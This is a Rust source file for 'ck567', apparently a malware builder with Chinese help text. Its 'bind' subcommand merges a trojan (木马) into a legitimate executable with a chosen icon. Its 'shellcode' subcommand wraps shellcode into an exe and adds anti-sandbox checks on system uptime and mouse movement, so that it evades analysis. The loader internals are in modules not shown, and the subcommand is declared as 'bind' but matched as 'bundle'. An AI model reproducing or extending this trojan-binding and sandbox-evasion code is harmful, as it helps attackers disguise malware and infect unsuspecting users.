use std::borrow::Borrow;
use std::ptr::null;

use aes::{Aes128, Aes128Dec, Aes128Enc};
use aes::cipher::{
    BlockCipher, BlockDecrypt, BlockEncrypt, generic_array::GenericArray,
    KeyInit,
};
use aes::cipher::{BlockDecryptMut, BlockEncryptMut};
use aes::cipher::block_padding::Pkcs7;
use clap::{Arg, Command};
use hex;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::sysinfoapi::GetTickCount;
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use winapi::um::winuser::{GetCursorPos, GetLastInputInfo, LASTINPUTINFO, MOUSEMOVEPOINT};

use crate::core::loader::{BindHandler, Loader, ShellCodeHandler};

pub mod utils;
pub mod core;


fn main() {
    println!("
                 ▄████▄   ██ ▄█▀
                ▒██▀ ▀█   ██▄█▒
                ▒▓█    ▄ ▓███▄░
                ▒▓▓▄ ▄██▒▓██ █▄
                ▒ ▓███▀ ░▒██▒ █▄
                ░ ░▒ ▒  ░▒ ▒▒ ▓▒
                  ░  ▒   ░ ░▒ ▒░
                ░        ░ ░░ ░
                ░ ░      ░  ░
                ░
");
    println!("version:0.3");

    let matches = Command::new("ck567")
        .subcommands([
            Command::new("bind")
                .about("捆绑exe")
                .arg(
                    Arg::new("file")
                        .short('f')
                        .help("exe 路径")
                        .required(true)
                ).arg(
                Arg::new("ico")
                    .short('i')
                    .help("ico")
                    .required(true)
            ).arg(Arg::new("trojan")
                .short('t')
                .required(true)
                .help("木马文件路径")),
            Command::new("shellcode")
                .about("shellcode 加载器")
                .arg(
                    Arg::new("file")
                        .short('f')
                        .help("shellcode 路径")
                        .required(true),
                )
                .arg(Arg::new("name").short('n').required(true).help("生成的exe 名称"))
                .arg(
                    Arg::new("ico")
                        .short('i')
                        .help("exe ico")
                        .required(false)
                ).arg(
                Arg::new("opTime")
                    .short('t')
                    .help("反沙盒：计算机运⾏时间 默认3600s 单位:秒 如果当前计算机小于 该参数则不执行。 op-time<0则 不检测")
                    .required(false)
            ).arg(
                Arg::new("mouseMovementDetection")
                    .short('m')
                    .help("反沙盒： 鼠标移动检测 如果当前计算机 鼠标没有移动过则不执行")
                    .required(false)
            )
        ]
        )
        .get_matches();

    if let Some(sub_m) = matches.subcommand_matches("shellcode") {
        let fp = sub_m.get_one::<String>("file").unwrap().clone();
        let name = sub_m.get_one::<String>("name").unwrap().clone();
        let ico;
        if let Some(value) = sub_m.get_one::<String>("ico") {
            ico = sub_m.get_one::<String>("ico").unwrap().clone();
        } else {
            ico = String::new();
        }
        let string = String::from("3600");
        let op_time = sub_m.get_one::<String>("opTime").or_else(||Some(&string)).unwrap().clone();
        let string = String::from("true");
        let mouse_movement_detection = sub_m.get_one::<String>("mouseMovementDetection").or_else(||Some(&string)).unwrap().clone();

        let shell_code_loader = ShellCodeHandler { file_path: fp, package_name: name, ico, op_time:op_time.clone().parse().unwrap(), mouse_movement_detection:mouse_movement_detection.parse().unwrap() };
        shell_code_loader.load();
    } else if let Some(sub_m_1) = matches.subcommand_matches("bundle") {
        let fp = sub_m_1.get_one::<String>("file").unwrap().clone();
        let trojan = sub_m_1.get_one::<String>("trojan").unwrap().clone();
        let ico;
        if let Some(value) = sub_m_1.get_one::<String>("ico") {
            ico = sub_m_1.get_one::<String>("ico").unwrap().clone();
        } else {
            ico = String::new();
        }

        let bind_handler = BindHandler { file_path: fp, trojan_file_path: trojan, ico };
        bind_handler.load();
    }
}
